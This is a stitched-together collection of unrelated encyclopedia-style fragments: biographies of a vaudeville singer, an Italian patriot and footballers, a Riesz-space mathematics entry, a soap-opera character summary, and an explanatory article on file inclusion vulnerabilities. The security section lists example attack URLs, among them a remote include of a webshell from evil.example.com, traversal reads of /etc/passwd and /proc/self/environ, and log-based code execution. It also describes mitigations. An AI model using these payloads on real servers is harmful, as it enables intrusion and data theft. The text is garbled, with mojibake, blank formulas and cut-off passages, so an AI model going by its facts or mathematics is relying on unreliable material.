Born in Milwaukee, Wisconsin, Fields began his career in Chicago, as a singer in Al Tierney's cafe on 22nd Street. The tall young man had a gentle, easygoing way with a song, and held the listeners' rapt attention with tunes like \\"Melancholy Baby.\\" Singer Blossom Seeley, touring in vaudeville, found Fields in 1921 and hired him to sing‚Äîoffstage‚Äîin accompaniment to her solo numbers, Fields's voice gradually got more attention until he became a partner in the act. The couple was married in 1922-a year after he was hired by Seeley. Fields's laid- back stylings complemented Seeley's vivacious beltings beautifully, and Seeley and Fields became very successful on stage and in recordings. In the late 1920s Warner Bros. filmed their songs and comic patter for Vitaphone short subjects. On radio, Fields was heard on The Ziegfeld Follies of the Air and other shows. Fields and Seeley were well-paid, saving and investing wisely. The couple believed they had no financial worries until the stock market crash of 1929 wiped out everything they had worked for. Vaudeville went into a steep and rapid decline at about the same time as the stock market. Fields and Seeley struggled until he launched a solo career in New York in 1933. Times were hard enough for the couple to file for bankruptcy in New York State in 1936. After Fields became an established star in his own right, Seeley retired in 1936 to simply be Mrs. Benny Fields. He appeared occasionally in films, most notably in The Big Broadcast of 1937, but remained a New York-based performer. He filmed four songs (including two of the Big Broadcast numbers) for Soundies in 1941. In 1936, he recorded 4 sides for Decca and in 1937, he recorded 8 sides for Variety. Benny Fields made a surprise comeback in 1944. The low-budget PRC studio mounted its most ambitious production around Fields, and hired the imaginative Joseph H. Lewis to direct it. The finished musical, Minstrel Man, was a credit to the star, director and studio. Reviewers were delighted by Fields's naturalistic performance‚Äîone critic described him as \\"a talent, voice, and personality the screen's been too long without.\\" Minstrel Man was a personal triumph for Fields, and PRC had planned to follow it up with a true-life film biography of Seeley and Fields. The story would not be told until 1952, however, in the Paramount film Somebody Loves Me (1952) with Betty Hutton and Ralph Meeker. Blossom Seeley came out of retirement during the filming of the movie. Seeley and Fields retired from performing in public, but George Burns fondly recalled a house party he threw in the late 1950s, when he asked the team to do one of their old vaudeville numbers. Seeley and Fields were rather embarrassed, worrying that their act wouldn't interest the many teenagers in the house, but at Burns's urging they sang‚Äîand their old magic captured the hearts of the young audience. Following the release of Somebody Loves Me, they recorded three LP albums for the Decca, MGM and Mercury labels and made occasional TV appearances on The Ed Sullivan Show. Following Fields' 1956 heart attack, the couple had few engagements; Fields' medical expenses wiped out the payments they had received from Somebody Loves Me. In 1959, Fields asked Ed Sullivan, who was arranging a floor show for the Nevada hotel and casino, the Desert Inn for a spot on the bill for himself and his wife. Sullivan agreed; the couple played at the Desert Inn, for a month, making a comeback with the engagement, which ended two weeks before Fields' death in New York City on August 16, 1959.

Monument to Menotti in Piazza Roma, Modena Ciro Menotti (22 January 1798 ‚Äì 23 May 1831) was an Italian patriot. Biography Menotti was born in Migliarina, near Carpi, then part of the Duchy of Modena and Reggio. A member of the Carboneria since 1817, he was a fervent democratic and patriot. From 1820 he held contacts with French intellectuals, with the goal to free Modena from the Austrian hegemony. Initially, duke Francis IV declared favorably for Menotti's claim, probably encouraged at the possibility of becoming its king in a future unified Northern Italy. Menotti organized a revolt in Modena for 3 February 1831 but, in a brusque volte-face, Francis denied him his support, and even, from his voluntary exile in Mantua, called the help of Austria and its allies. Menotti was arrested and, after a summary process, condemned to death by hanging. The sentence was executed in the Citadel of Modena. Afterwards Menotti become the idealized figure of patriotic martyr of the Italian Risorgimento. In 1880 the former Garibaldine officer Taddeo Grandi wrote a biography of him. A monument in Modena was built to Menotti in 1879, facing the former Grand Duke's palace. Giuseppe Garibaldi named one of his children \\"Menotti\\" after him.

Early days Rofe attended Whitechapel Secondary School, together with Terry Brisley, who later played alongside him at Leyton Orient. He also represented East London Schools. Playing career Leyton Orient He started his career at Leyton Orient, originally as an associate schoolboy in March 1964, turning professional in February 1968. He was a fast, tough-tackling left-back who starred in Orient's 1969‚Äì70 Third Division title triumph. He was ever- present in 1970‚Äì71 and a key figure in Orient's 1971‚Äì72 FA Cup run. He netted six goals in 172 League appearances for Orient before following Jimmy Bloomfield to Leicester City for ¬£112,000 in August 1972, which made him the most expensive full-back in British football at that time. Leicester City Rofe was signed by Bloomfield to fill the left back position after David Nish had been sold to Derby County for a record fee of ¬£250,000. Rofe was an attacking full back with great pace and he made an instant impact in the Leicester City team. He remained faithful to Leicester after Bloomfield left the club in 1977, but was surprisingly sold to Second Division Chelsea, in February 1980, shortly before Leicester won promotion back to the First Division. Rofe made his England U.23 debut as a City player in 1973. In his eight seasons at Leicester he played 290 league games for the club and scored six goals. Chelsea and Southampton Rofe then spent three seasons at Chelsea as they drifted in Division 2, including a period as team captain. In July 1982, Lawrie McMenemy signed him on a free transfer for First Division Southampton, where he played out the last two years of his playing career. Coaching and management Southampton In 1984, he joined Southampton's coaching staff under the manager Chris Nicholl, initially as the reserve team coach, moving up to first team coach in 1987. Bristol Rovers He joined Bristol Rovers as a coach in July 1991. Shortly after joining Rovers, he replaced Martin Dobson, firstly as caretaker manager, taking the position permanently in October 1991. Rovers finished the 1991‚Äì92 season in 13th position in Division 2. In November 1992, Rofe resigned. He then moved briefly to Stoke City as the reserve team manager before returning to Southampton as the youth team coach. This position lasted until July 1997 when he moved on to Fulham as a coach, before a brief spell coaching for Kingstonian. Southampton (again) In April 1998, he returned to Southampton as coach of their Academy, but soon moved up to reserve team coach and, in March 2001, to first team coach, under Stuart Gray. He served as first team coach and assistant manager as Southampton had a rapid turnover of managers. His greatest moment as a Southampton coach was when Southampton reached the 2003 F.A. Cup final under Gordon Strachan, losing 1‚Äì0 to Arsenal. As assistant manager at Southampton, he had a fiery reputation. On 10 January 2002, he had to be separated from the acting Liverpool manager Phil Thompson by the fourth official in a touchline argument over a bad tackle on Brett Ormerod. On 8 May 2004, Rofe was ordered from the technical area after protesting about the award of a penalty to Aston Villa. Most infamous was probably the row with the Blackburn Rovers boss, Graeme Souness, on 25 October 2003, following an unseemly brawl in which Andy Cole was sent off. Souness accused Rofe of trying to influence the officials, although he later had to accept that the sending off was justified. In December 2005, following the appointment of George Burley as manager, Rofe was dismissed along with most of the coaching staff at St. Mary's. Since 2005 Since leaving Southampton, Rofe has been engaged as a match summariser on BBC Radio 5, and spent the summer of 2006 working in the Bahamas with Luther Blissett at the annual Premier League Soccer Camp. He was working as the Football League's regional youth development officer until June 2012 before joining League One side AFC Bournemouth in 2012 as first-team coach working under management team Paul Groves and Shaun Brooks. On 3 October 2012, Groves was sacked as manager of the club, and Rofe took over as caretaker. He was unceremoniously sacked on 15 October, whilst Groves and Brooks were allowed to return to their former jobs with the youth team at Bournemouth. https://www.bbc.co.uk/sport/0/football/19816075 Footnotes References  External links * Dennis Rofe managerial statistics at Soccerbase * Photo and statistics from Leicester era Category:1950 births Category:Living people Category:People from Epping Category:English footballers Category:England under-23 international footballers Category:Leyton Orient F.C. players Category:Leicester City F.C. players Category:Chelsea F.C. players Category:Southampton F.C. players Category:Bristol Rovers F.C. managers Category:Southampton F.C. non-playing staff Category:Stoke City F.C. non-playing staff Category:Association football defenders Category:English football managers ","title":"Dennis Rofe"},{"id":"8098996","text":"Legend of Sudsakorn () is a 2006 Thai fantasy film.

He played in all 22 games after his arrival in Franconia but could not prevent the side going down despite scoring his first goal for the Club in the final game of the season. This game saw N√ºrnberg dropping from a secure 12th spot going into the match to being relegated on scored goals as 16th of the league at the end of the match. Nikl stayed with the team and was a cornerstone in the following two seasons. N√ºrnberg were promoted again at the end of the 2000‚Äì01 season and successfully staved off relegation in the following season, with the Czech defender again playing a vital role in doing so. However, the team could not accomplish the feat a second time and were relegated again at the end of the 2002‚Äì03 season. Nikl still played in most of the games for the team and was well established within the team's hierarchy. He chose not to leave the club and stayed on to help the team get promoted for a third time during his spell at N√ºrnberg. Once more, Nikl proved a valuable asset during the successful promotion campaign the following season missing merely six of thirty-four games. N√ºrnberg stayed up the next year and Nikl played in 25 matches, twice missing three matches in a row due to injuries. With the beginning of the 2005‚Äì06 season, Nikl seemed to fall out of coach Wolfgang Wolf's favor playing just five of the eleven games until Wolf's dismissal. With the arrival of new coach Hans Meyer, Nikl was back in the starting line-up playing all of the remaining twenty-two matches stabilising N√ºrnberg's defence in the process. Troubled by minor injuries and problems with his stamina, Nikl was forced to sit out the start of the following 2006‚Äì07 season coming on in only seven games. Nevertheless, he was part of the squad that won the national cup in May 2007. In the following season, Nikl played several matches for the second team squad in the German fourth division.

This issue is caused when an application builds a path to executable code using an attacker-controlled variable in a way that allows the attacker to control which file is executed at run time. A file include vulnerability is distinct from a generic directory traversal attack, in that directory traversal is a way of gaining unauthorized file system access, and a file inclusion vulnerability subverts how an application loads code for execution. Successful exploitation of a file inclusion vulnerability will result in remote code execution on the web server that runs the affected web application. An attacker can use remote code execution to create a web shell on the web server, which can be used for website defacement. Types of Inclusion  Remote file inclusion  Remote file inclusion (RFI) occurs when the web application downloads and executes a remote file. These remote files are usually obtained in the form of an HTTP or FTP URI as a user- supplied parameter to the web application.  Local file inclusion  Local file inclusion (LFI) is similar to a remote file inclusion vulnerability except instead of including remote files, only local files i.e. files on the current server can be included for execution. This issue can still lead to remote code execution by including a file that contains attacker-controlled data such as the web server's access logs. Programming languages PHP In PHP the main cause is due to the use of unvalidated user-input with a filesystem function that includes a file for execution. Most notable are the \`include\` and \`require\` statements. Most of the vulnerabilities can be attributed to novice programmers not being familiar with all of the capabilities of the PHP programming language. The PHP language has a directive which, if enabled, allows filesystem functions to use a URL to retrieve data from remote locations. The directive is \`allow_url_fopen\` in PHP versions <= 4.3.4 and \`allow_url_include\` since PHP 5.2.0. In PHP 5.x this directive is disabled by default, in prior versions it was enabled by default. To exploit the vulnerability an attacker will alter a variable that is passed to one of these functions to cause it to include malicious code from a remote resource. To mitigate this vulnerability all user input needs to be validated before being used. Example Consider this PHP script which includes a file specified by request: English French ... The developer intended to read in \`english.php\` or \`french.php\`, which will alter the application's behavior to display the language of the user's choice. But it is possible to inject another path using the \`language\` parameter. * \`/vulnerable.php?language=http://evil.example.com/webshell.txt?\` \\\\- injects a remotely hosted file containing a malicious code (remote file include) * \`/vulnerable.php?language=C:\\\\\\\\ftp\\\\\\\\upload\\\\\\\\exploit\` \\\\- Executes code from an already uploaded file called \`exploit.php\` (local file inclusion vulnerability) * \`/vulnerable.php?language=C:\\\\ otes.txt%00\` \\\\- example using NULL meta character to remove the \`.php\` suffix, allowing access to files other than \`.php\`. This use of null byte injection was patched in PHP 5.3, and can no longer be used for LFI/RFI attacks. * \`/vulnerable.php?language=../../../../../etc/passwd%00\` \\\\- allows an attacker to read the contents of the \`/etc/passwd\` file on a Unix-like system through a directory traversal attack. * \`/vulnerable.php?language=../../../../../proc/self/environ%00\` \\\\- allows an attacker to read the contents of the \`/proc/self/environ\` file on a Unix-like system through a directory traversal attack. An attacker can modify a HTTP header (such as \`User-Agent\`) in this attack to be PHP code to exploit remote code execution. The best solution in this case is to use a whitelist of accepted language parameters. If a strong method of input validation such as a whitelist cannot be used, then rely upon input filtering or validation of the passed-in path to make sure it does not contain unintended characters and character patterns. However, this may require anticipating all possible problematic character combinations. A safer solution is to use a predefined Switch/Case statement to determine which file to include rather than use a URL or form parameter to dynamically generate the path.  JavaServer Pages (JSP)  JavaServer Pages (JSP) is a scripting language which can include files for execution at runtime.  Example  The following script is vulnerable to a file inclusion vulnerability: <% String p = request.getParameter(\\"p\\"); @include file=\\"<%=\\"includes/\\" + p +\\".jsp\\"%>\\" %> * \`/vulnerable.jsp?p=../../../../var/log/access.log%00\` \\\\- Unlike PHP, JSP is still affected by Null byte injection, and this param will execute JSP commands found in the web server's access log.  Server Side Includes (SSI)  A Server Side Include is very uncommon and are not typically enabled on a default web server. A server-side include can be used to gain remote code execution on a vulnerable web server.  Example  The following code is vulnerable to a remote-file inclusion vulnerability: The above code is not an XSS vulnerability, but rather including a new file to be executed by the server.

Riesz spaces are named after Frigyes Riesz who first defined them in his 1928 paper Sur la d√©composition des op√©rations fonctionelles lin√©aires. Riesz spaces have wide ranging applications. They are important in measure theory, in that important results are special cases of results for Riesz Spaces. E.g. the Radon‚ÄìNikodym theorem follows as a special case of the Freudenthal spectral theorem. Riesz spaces have also seen application in mathematical economics through the work of Greek-American economist and mathematician Charalambos D. Aliprantis.  Definition   Preliminaries  If X is an ordered vector space and if S is a subset of X then an element b ‚àà X is an upper bound (resp. lower bound) of S if s ‚â§ b (resp. s ‚â• b) for all s ‚àà S. An element a in X is the least upper bound or supremum (resp. greater lower bound or infimum) of S if it is an upper bound (resp. a lower bound) of S and if for any upper bounded (resp. any lower bound) of b of S, we have a ‚â§ b (resp. a ‚â• b).  Definitions   Preordered vector lattice  A preordered vector lattice is a preordered vector space in which every pair of elements has a supremum. More explicitly, a preordered vector lattice is vector space endowed with a preorder, , such that for any ‚àà : # Translation Invariance: implies . # Positive Homogeneity: For any scalar , implies . # For any pair of vectors in there exists a supremum (denoted ) in with respect to the order . The preorder, together with items 1 and 2, which make it \\"compatible with the vector space structure\\", make an preordered vector space. Item 3 says that the preorder is a join semilattice. Because the preorder is compatible with the vector space structure, one can show that any pair also have an infimum, making also a meet semilattice, hence a lattice. A preordered vector space E is a preordered vector lattice if and only if it satisfies any of the following equivalent properties: 1. For any ‚àà , their supremum exists in . 2. For any ‚àà , their infimum exists in . 3. For any ‚àà , their infimum and their supremum exist in . 4. For any ‚àà , sup { x, 0 } exists.  Riesz space and vector lattices  A Riesz space or a vector lattice is a preordered vector lattice whose preorder is a partial order. Equivalently, it is an ordered vector space for which the ordering is a lattice. Note that many authors required that a vector lattice be a partially ordered vector space (rather than merely a preordered vector space) while others only require that it be a preordered vector space. We will henceforth assume that every Riesz space and every vector lattice is an ordered vector space but that a preordered vector lattice is not necessarily partially ordered. If E is an ordered vector space over \\\\mathbb{R} with positive whose positive cone C is generating (i.e. such that E = C - C), and if for every x, y ‚àà C either \\\\sup\\\\\\\\{ x, y \\\\\\\\} or \\\\inf \\\\\\\\{ x, y \\\\\\\\} exists, then E is a vector lattice.  Intervals  An order interval in a partially ordered vector space is a convex set of the form [a,b] = { x : a ‚â§ x ‚â§ b }. In an ordered real vector space, every interval of the form [‚àíx, x] is balanced. From axioms 1 and 2 above it follows that x,y in [a,b] and Œª in (0,1) implies Œªx + (1 ‚àí Œª)y in [a,b]. A subset is said to be order bounded if it is contained in some order interval. An order unit of a preordered vector space is any element x such that the set [‚àíx, x] is absorbing. The set of all linear functionals on a preordered vector space V that map every order interval into a bounded set is called the order bound dual of V and denoted by Vb If a space is ordered then its order bound dual is a vector subspace of its algebraic dual. A subset A of a vector lattice E is called order complete if for every non-empty subset B ‚äÜ A such that B is order bounded in A, both \\\\sup B and \\\\inf B exist and are elements of A. We say that a vector lattice E is order complete is E is an order complete subset of E.  Finite dimensional Riesz spaces  Finite dimensional vector lattices fall into one of two categories depending on whether or not the lattice is Archimedean ordered. :Theorem: Suppose that X is a vector lattice of finite dimension n. If X is Archimedean ordered then it is (vector lattice) isomorphic with \\\\mathbb{R}^{n} under its canonical order. Otherwise, there exists an integer k satisfying 2 ‚â§ k ‚â§ n such that X is isomorphic to \\\\mathbb{R}^{k}_{L} \\\\times \\\\mathbb{R}^{n-k} where \\\\mathbb{R}^{n-k} has its canonical order, \\\\mathbb{R}^{k}_{L} is \\\\mathbb{R}^{k} with the lexicographical order, and the product of these two spaces has the canonical product order. As with finite dimensional topological vector spaces, finite dimensional vector lattices are thus found to be uninteresting.  Basic properties  Every Riesz space is a partially ordered vector space, but not every partially ordered vector space is a Riesz space. Note that for any subset A of X, \\\\sup A = - \\\\inf \\\\left( - A \\\\right) whenever either the supremum or infimum exists (in which case they both exist). If x \\\\geq 0 and y \\\\geq 0 then [0, x] + [0, y] = [0, x + y]. For all a, b, x, and y in a Riesz space X, we have a - inf(x, y) + b = sup(a - x + b, a - y + b).  Absolute value  For every element x in a Riesz space X, the absolute value of x, denoted by |x|, is defined to be x := \\\\sup \\\\left\\\\\\\\{ x, - x \\\\right\\\\\\\\}, where this satisfies -|x‚â§ x ‚â§ |xand |x‚â• 0. For any x and y in X and any real number r, we have r x = r  x and x + y \\\\leq x + y |.  Disjointness  We say that two elements x and y in a vector lattice x are lattice disjoint or disjoint if \\\\inf \\\\left\\\\\\\\{ |x|, |y\\\\right\\\\\\\\} = 0, in which case we write x \\\\perp y. Two elements x and y are disjoint if and only if \\\\sup\\\\\\\\{ x |, y \\\\\\\\} = x + y |. If x and y are disjoint then x + y = x + y and \\\\left(x + y \\\\right)^{+} = x^{+} + y^{+}, where for any element z, z^{+} := \\\\sup \\\\left\\\\\\\\{ z, 0 \\\\right\\\\\\\\} and z^{-} := \\\\sup \\\\left\\\\\\\\{ -z, 0 \\\\right\\\\\\\\}. We say that two sets A and B are disjoint if a and b are disjoint for all a in A and all b in B, in which case we write A \\\\perp B. If A is the singleton set \\\\\\\\{ a \\\\\\\\} then we will write a \\\\perp B in place of \\\\\\\\{ a \\\\\\\\} \\\\perp B. For any set A, we define the disjoint complement to be the set A^{\\\\perp} := \\\\left\\\\\\\\{ x \\\\in X : x \\\\perp A \\\\right\\\\\\\\}. Disjoint complements are always bands, but the converse is not true in general. If A is a subset of X such that x = \\\\sup A exists, and if B is a subset lattice in X that is disjoint from A, then B is a lattice disjoint from \\\\\\\\{ x \\\\\\\\}.  Representation as a disjoint sum of positive elements  For any x in X, let x^{+} := \\\\sup \\\\left\\\\\\\\{ x, 0 \\\\right\\\\\\\\} and x^{-} := \\\\sup \\\\left\\\\\\\\{ -x, 0 \\\\right\\\\\\\\}, where note that both of these elements are \\\\geq 0 and x = x^{+} - x^{-} with x = x^{+} + x^{-}. Then x^{+} and x^{-} are disjoint, and x = x^{+} - x^{-} is the unique representation of x as the difference of disjoint elements that are \\\\geq 0. For all x and y in X, \\\\leftx^{+} - y^{+} \\\\right\\\\leq x - y and x + y = \\\\sup\\\\\\\\{ x, y \\\\\\\\} + \\\\inf\\\\\\\\{ x, y \\\\\\\\}. If y ‚â• 0 and x ‚â§ y then x+ ‚â§ y. Moreover, x \\\\leq y if and only if x^{+} \\\\leq y^{+} and x^{-} \\\\leq x^{-1}. Every Riesz space is a distributive lattice; that is, it has the following equivalent properties: for all x, y, and z in X # x ‚àß (y ‚à® z) = (x ‚àß y) ‚à® (x ‚àß z) # x ‚à® (y ‚àß z) = (x ‚à® y) ‚àß (x ‚à® z) ¬ß6, Theorem 9For individual elements x, y, z, e.g. the first equation may be violated, but the second may hold; see the N5 picture for an example. # (x\\\\wedge y)\\\\vee (y\\\\wedge z)\\\\vee (z\\\\wedge x) = (x\\\\vee y)\\\\wedge (y\\\\vee z)\\\\wedge (z\\\\vee x). # x\\\\wedge z = y\\\\wedge z and x\\\\vee z = y\\\\vee z always imply x=y. Every Riesz space has the Riesz decomposition property.  Order convergence  There are a number of meaningful non-equivalent ways to define convergence of sequences or nets with respect to the order structure of a Riesz space. A sequence in a Riesz space is said to converge monotonely if it is a monotone decreasing (resp. increasing) sequence and its infimum (supremum) exists in and denoted , (resp. ). A sequence in a Riesz space is said to converge in order to if there exists a monotone converging sequence in such that . If is a positive element of a Riesz space then a sequence in is said to converge u-uniformly to if for any there exists an such that for all .  Subspaces  The extra structure provided by these spaces provide for distinct kinds of Riesz subspaces. The collection of each kind structure in a Riesz space (e.g. the collection of all ideals) forms a distributive lattice.  Sublattices  If X is a vector lattice then a vector sublattice is a vector subspace F of X such that for all x and y in F, \\\\sup\\\\\\\\{ x, y \\\\\\\\} belongs to F (where this supremum is taken in X). It can happen that a subspace F of X is a vector lattice under its canonical order but is not a vector sublattice of X.  Ideals  A vector subspace of a Riesz space is called an ideal if it is solid, meaning if for and , we have: implies that . The intersection of an arbitrary collection of ideals is again an ideal, which allows for the definition of a smallest ideal containing some non-empty subset of , and is called the ideal generated by . An Ideal generated by a singleton is called a principal ideal.  Bands and -Ideals  A band in a Riesz space is defined to be an ideal with the extra property, that for any element in for which its absolute value is the supremum of an arbitrary subset of positive elements in , that is actually in . -Ideals are defined similarly, with the words 'arbitrary subset' replaced with 'countable subset'. Clearly every band is a -ideal, but the converse is not true in general. The intersection of an arbitrary family of bands is again a band. As with ideals, for every non-empty subset of , there exists a smallest band containing that subset, called the band generated by . A band generated by a singleton is called a principal band.  Projection bands  A band in a Riesz space, is called a projection band, if , meaning every element in , can be written uniquely as a sum of two elements, , with in and in . There then also exists a positive linear idempotent, or projection, , such that . The collection of all projection bands in a Riesz space forms a Boolean algebra. Some spaces do not have non-trivial projection bands (e.g. ), so this Boolean algebra may be trivial.  Completeness  A vector lattice is complete if every subset has both a supremum and an infimum. A vector lattice is Dedekind complete if each set with an upper bound has a supremum and each set with a lower bound has an infimum. An order complete, regularly ordered vector lattice whose canonical image in its order bidual is order complete is called minimal and is said to be of minimal type.  Subspaces, quotients, and products  ;Sublattices If M is a vector subspace of a preordered vector space X then the canonical ordering on M induced by X's positive cone C is the preorder induced by the pointed convex cone C ‚à© M, where this cone is proper if C is proper (i.e. if (C‚à©-C=‚àÖ). A sublattice of a vector lattice X is a vector subspace M of X such that for all x and y in M, supX(x, y) belongs to X (importantly, note that this supremum is taken in X and not in M). If X = L^{p}\\\\left( [0, 1], \\\\mu \\\\right) with 0 < p < 1, then the 2-dimensional vector subspace M of X defined by all maps of the form t \\\\mapsto a t + b (a, b ‚àà \\\\mathbb{R}) is a vector lattice under the induced order but is not a sublattice of X. This despite X being an order complete Archimedean ordered topological vector lattice. Furthermore, there exist vector a vector sublattice N of this space X such that N ‚à© C has empty interior in X but no positive linear functional on N can be extended to a positive linear functional on X. ;Quotient lattices Let M be a vector subspace of an ordered vector space X having positive cone C, let \\\\pi : X \\\\to X / M be the canonical projection, and let \\\\hat{C} := \\\\pi(C). Then \\\\hat{C} is a cone in X/M that induces a canonical preordering on the quotient space X/M. If \\\\hat{C} is a proper cone in X/M then \\\\hat{C} makes X/M into an ordered vector space. If M is C-saturated then \\\\hat{C} defines the canonical order of X/M. Note that X=\\\\mathbb{R}^2_{0} provides an example of an ordered vector space where \\\\pi(C) is not a proper cone. If X is a vector lattice and N is a solid vector subspace of X then \\\\hat{C} defines the canonical order of X/M under which L/M is a vector lattice and the canonical map \\\\pi : X \\\\to X / M is a vector lattice homomorphism. Furthermore, if X is order complete and M is a band in X then X/M is isomorphic with M‚üÇ. Also, if M is solid then the order topology of X/M is the quotient of the order topology on X. If X is a topological vector lattice and M is a closed solid sublattice of X then X/L is also a topological vector lattice. ;Product If S is any set then the space XS of all functions from S into X is canonically ordered by the proper cone \\\\left\\\\\\\\{ f \\\\in X^S : f(s) \\\\in C \\\\text{ for all } s \\\\in S \\\\right\\\\\\\\}. Suppose that \\\\left\\\\\\\\{ X_\\\\alpha : \\\\alpha \\\\in A \\\\right\\\\\\\\} is a family of preordered vector spaces and that the positive cone of X_\\\\alpha is C_\\\\alpha. Then C := \\\\prod_{\\\\alpha} C_\\\\alpha is a pointed convex cone in \\\\prod_\\\\alpha X_\\\\alpha, which determines a canonical ordering on \\\\prod_\\\\alpha X_\\\\alpha; C is a proper cone if all C_\\\\alpha are proper cones. ;Algebraic direct sum The algebraic direct sum \\\\bigoplus_\\\\alpha X_\\\\alpha of \\\\left\\\\\\\\{ X_\\\\alpha : \\\\alpha \\\\in A \\\\right\\\\\\\\} is a vector subspace of \\\\prod_\\\\alpha X_\\\\alpha that is given the canonical subspace ordering inherited from \\\\prod_\\\\alpha X_\\\\alpha. If X1, ..., Xn are ordered vector subspaces of an ordered vector space X then X is the ordered direct sum of these subspaces if the canonical algebraic isomorphism of X onto \\\\prod_\\\\alpha X_{\\\\alpha} (with the canonical product order) is an order isomorphism.  Spaces of linear maps  A cone C in a vector space X is said to be generating if C ‚àí C is equal to the whole vector space. If X and W are two non-trivial ordered vector spaces with respective positive cones P and Q, then P is generating in X if and only if the set C = \\\\left\\\\\\\\{ u \\\\in L(X; W) : u(P) \\\\subseteq Q \\\\right\\\\\\\\} is a proper cone in L(X; W), which is the space of all linear maps from X into W. In this case the ordering defined by C is called the canonical ordering of L(X; W). More generally, if M is any vector subspace of L(X; W) such that C ‚à© M is a proper cone, the ordering defined by C ‚à© M is called the canonical ordering of M. A linear map u between two preordered vector spaces X and Y with respective positive cones C and D is called positive if u(C) ‚äÜ D. If X and Y are vector lattices with Y order complete and if H is the set of all positive linear maps from X into Y then the subspace M := H - H of L(X; Y) is an order complete vector lattice under its canonical order; furthermore, M contains exactly those linear maps that map order intervals of X into order intervals of Y.  Positive functionals and the order dual  A linear function f on a preordered vector space is called positive if x ‚â• 0 implies f(x) ‚â• 0. The set of all positive linear forms on a vector space, denoted by C^{*}, is a cone equal to the polar of ‚àíC. The order dual of an ordered vector space X is the set, denoted by X^{+}, defined by X^{+} := C^{*} - C^{*}. Although X^{+} \\\\subseteq X^{b}, there do exist ordered vector spaces for which set equality does not hold.  Vector lattice homomorphism  Suppose that X and Y are preordered vector lattices with positive cones C and D and let u be a map from X into Y. Then u is a preordered vector lattice homomorphism if u is linear and if any one of the following equivalent conditions hold: 1. u preserves the lattice operations 2. u(sup{x, y}) = sup{u(x), u(y)} for all x, y ‚àà X 3. u(inf{x, y}) = inf{u(x), u(y)} for all x, y ‚àà X 4. u(|x|) = sup{u(x+), u(x‚àí)} for all x ‚àà X 5. 0 = inf{u(x+), u(x‚àí)} for all x ‚àà X 6. u(C) = D and u‚àí1(0) is a solid subset of X. 7. if x ‚â• 0 then u(x) ‚â• 0\\\\. 8. u is order preserving. A pre-ordered vector lattice homomorphism that is bijective is a pre-ordered vector lattice isomorphism. A pre-ordered vector lattice homomorphism between two Riesz spaces is called a vector lattice homomorphism; if it is also bijective, then it is called a vector lattice isomorphism. If u is a non-0 linear functional on a vector lattice X with positive cone C then the following are equivalent: 1. u : X \\\\to \\\\mathbb{R} is a surjective vector lattice homomorphism. 2. 0 = inf{u(x+), u(x‚àí)} for all x ‚àà X 3. u ‚â• 0 and u‚àí1(0) is a solid hyperplane in X. 4. u' generates an extreme ray of the cone C* in X* Recall that an extreme ray of the cone C is a set {rx : r ‚â• 0} where x ‚ààC, x is non-0, and if y ‚ààC is such that x - y ‚ààC then y = s x for some s such that 0 ‚â§ s ‚â§ 1. A vector lattice homomorphism from X into Y is a topological homomorphism when X and Y are given their respective order topologies.  Projection properties  There are numerous projection properties that Riesz spaces may have. A Riesz space is said to have the (principal) projection property if every (principal) band is a projection band. The so-called main inclusion theorem relates the following additional properties to the (principal) projection property: A Riesz space is‚Ä¶ * Dedekind Complete (DC) if every nonempty set, bounded above, has a supremum; * Super Dedekind Complete (SDC) if every nonempty set, bounded above, has a countable subset with identical supremum; * Dedekind -complete if every countable nonempty set, bounded above, has a supremum; and * Archimedean property if, for every pair of positive elements and , there exists an integer such that . Then these properties are related as follows. SDC implies DC; DC implies both Dedekind -completeness and the projection property; Both Dedekind œÉ-completeness and the projection property separately imply the principal projection property; and the principal projection property implies the Archimedean property. None of the reverse implications hold, but Dedekind -completeness and the projection property together imply DC.  Examples  * The space of continuous real valued functions with compact support on a topological space with the pointwise partial order defined by when for all in , is a Riesz space. It is Archimedean, but usually does not have the principal projection property unless satisfies further conditions (e.g. being extremally disconnected). * Any with the (almost everywhere) pointwise partial order is a Dedekind complete Riesz space. * The space with the lexicographical order is a non-Archimedean Riesz space.

Casting He was played by Brandon Buddy from October 10, 2006, to November 10, 2010. He is also the nephew of Ian Thornhart, Patrick's identical twin brother from the now-defunct series Port Charles. In June 2010, fans were shocked when Buddy announced through his Twitter account that he would be leaving the show. Just days later, Buddy revealed that his Twitter account was hacked and he was remaining with the show. However, in August 2010, the rumors were proved to be true, and Buddy departed the series in November 2010. In October 2011 it was announced that Brandon Buddy would return as Cole. However, he taped for only one day before leaving for undisclosed personal reasons. On November 1, 2011, it was announced that Van Hughes would take over the role of Cole. Van played Cole from January 3, 2012, to January 13, 2012. On January 30, 2012, ABC Soaps In Depth announced that Hughes would temporarily reprise his role of Cole to help usher in Alderson's Starr Manning to General Hospital. Hughes' allotted number of episodes will not interrupt his time on Broadway.http://abc.soapsindepth.com/2012/01/cole-starr-together-again.html Backstory Cole Thornhart is originally born off-screen in 1998, the son of the Patrick Thornhart and Marty Saybrooke, well-known characters from OLTL history. As of 2012, his birth date is established as November 26, 1990. Patrick and Marty lived in Ireland briefly with newborn Cole, and then relocated to San Diego. However, on Christmas 2005, Patrick is supposedly killed. Marty had fallen into a depressing era of her life. Luckily, Cole came up with the idea of moving. With this idea, Marty became positive, and, meanwhile, homesick. She decided to move back to Llanview in September 2006. Storylines 2006‚Äì08 Cole was first seen at a party that Starr Manning and her friend Langston Wilde attended after being invited by some boys. When several boys at the party wanted to get too intense with the girls, Cole stepped in and did so later when they received taunts from their enemy, Britney Jennings. Starr and Cole started to get closer, attending a dance together and sharing their first kiss. In November 2006, Cole had a steroid- induced outburst towards Starr, much to the thanks of Britney and football player Gabe, when they started to make out in a bedroom following a football after-party. Cole wanted to go further, but Starr did not. As a result, Cole completely lost it and began to trash the room. In this process, he ripped the front of Starr's shirt, by accident. The fight continued out into the kitchen, where Cole proceeded to get angry at many other people. When Starr just wanted to go home, Britney wouldn't allow it and called the police, pretending to be Starr. When the police showed up at her home and wanted to question her about the events that took place, Starr hesitantly agreed. As the police questioned her, Cole and his mother arrived at the police station. Everyone was surprised when they realized who Cole's mother was, Marty Saybrooke. In December 2006, Starr decided to forgive Cole. She apologized for her father's past actions towards his mother. Cole assures Starr that it was not her fault and that she couldn't have done anything to prevent the situation from occurring. Starr got into a fight with Langston, as she was continuously bad-mouthing Cole and his behavior. Langston accused Starr of still having strong feelings for him, with Cole overhearing the conversation. Starr reassured Cole, saying that he shouldn't believe Langston and all she has said about him. Cole disagreed, claiming that Langston was acting as a true friend by stating the obvious. Cole decided it was best to end their friendship, with Starr wondering if he cared about what she wanted. In early January 2007, Britney Jennings decided to take extreme measures to do anything in her power to hook-up with Cole. She knew that with Starr having feelings towards him, it only made the challenge more 